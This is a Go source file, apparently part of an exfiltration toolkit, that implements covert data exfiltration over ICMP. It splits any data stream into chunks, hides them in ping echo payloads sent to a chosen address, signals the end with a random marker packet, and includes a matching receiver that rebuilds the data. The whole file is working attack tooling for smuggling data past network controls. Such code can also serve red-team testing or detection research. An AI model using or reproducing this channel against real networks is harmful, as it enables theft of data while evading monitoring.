package exfil

import (
	crand "crypto/rand"
	"fmt"
	"io"
	mrand "math/rand"

	"net"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
	ICMP_EXFILTRATOR_CHUNK_SIZE = 64
	ICMP_INITIAL_SEQ            = 1
	BUFFER_SIZE                 = 1500
)

type ICMP struct {
	currentSeq int
}

func NewICMP() *ICMP {
	return &ICMP{
		currentSeq: ICMP_INITIAL_SEQ,
	}
}

func (e *ICMP) Exfiltrate(data io.Reader, to string) error {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	bytes := make([]byte, ICMP_EXFILTRATOR_CHUNK_SIZE)

	for {
		n, err := data.Read(bytes)
		if err == io.EOF {
			break
		} else if err != nil {
			return err
		}

		// Create an ICMP echo message containing the chunk of data
		msg := icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Body: &icmp.Echo{
				ID:   1,
				Seq:  e.currentSeq,
				Data: bytes[:n],
			},
		}

		// Marshal creates a raw ICMP message, including the checksum
		msgData, err := msg.Marshal(nil)
		if err != nil {
			return err
		}

		written, err := conn.WriteTo(msgData, &net.IPAddr{IP: net.ParseIP(to)})
		if err != nil {
			return err
		}

		if written != len(msgData) {
			return fmt.Errorf("wrote %d bytes, expected %d", written, len(msgData))
		}

		e.currentSeq++
	}

	// Send end-of-transfer using (current sequence number + 2) and random amount of bytes
	n := mrand.Intn(ICMP_EXFILTRATOR_CHUNK_SIZE)
	endData := make([]byte, n)
	crand.Read(endData)

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Body: &icmp.Echo{
			ID:   1,
			Seq:  e.currentSeq + 2,
			Data: endData,
		},
	}

	msgData, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.WriteTo(msgData, &net.IPAddr{IP: net.ParseIP(to)})
	if err != nil {
		return err
	}

	return nil
}

func (e *ICMP) Receive(output io.Writer) error {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	bytes := make([]byte, BUFFER_SIZE)
	expectedSeq := ICMP_INITIAL_SEQ

	for {
		n, _, err := conn.ReadFrom(bytes)
		if err == io.EOF {
			return nil
		} else if err != nil {
			return err
		}

		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), bytes[:n])
		if err != nil {
			continue
		}

		if msg.Type == ipv4.ICMPTypeEcho {
			echo := msg.Body.(*icmp.Echo)

			// Check for end-of-transfer
			if echo.Seq == expectedSeq+2 {
				return nil
			}

			// Only writes data if the sequence number is the expected sequence number
			if echo.Seq == expectedSeq {
				output.Write(echo.Data)
				expectedSeq++
			}
		}
	}
}
